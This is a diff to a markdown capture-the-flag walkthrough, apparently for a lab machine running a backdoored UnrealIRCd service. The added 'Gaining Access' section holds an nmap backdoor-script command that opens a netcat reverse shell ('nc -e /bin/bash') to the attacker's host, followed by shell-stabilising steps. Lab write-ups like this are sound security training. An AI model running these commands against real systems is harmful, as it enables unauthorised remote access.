@@ -59,18 +59,37 @@ nmap -p 6697,8067,65534 --script=irc-unrealircd-backdoor 10.10.10.117
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca03c40-0895-4f7f-b1d9-aeb4c1d0711d)
 
+
+
+## Gaining Access
+
+### Method 1
 + Start a netcat listener on the attack machine: `nc -lnvp 4444`
 + Try to send a reverse shell to the attack machine netcat listener from the target machine.
 ```
 nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
 ```
 
-+ It fails, and no shell!
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7deaa2bd-2168-492b-b10e-0dffbcec8c6e)
++ Get the shell,
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1a5b205-1807-4db2-8333-5c924009a39d)
 
 
-## Gaining Access
-+ x
++ Do more stable shell.
+```
+script /dev/null -c bash
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+reset
+terminal type? 'screen' or 'xterm'
+export TERM=xterm  
+export SHELL=bash
+stty rows 55 columns 285
+```
+
++ There's no permission to read the user flag.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54a47658-1c3e-4daa-ac61-9b5ce93d48b7)
 
 
 ## Privilege Escalation
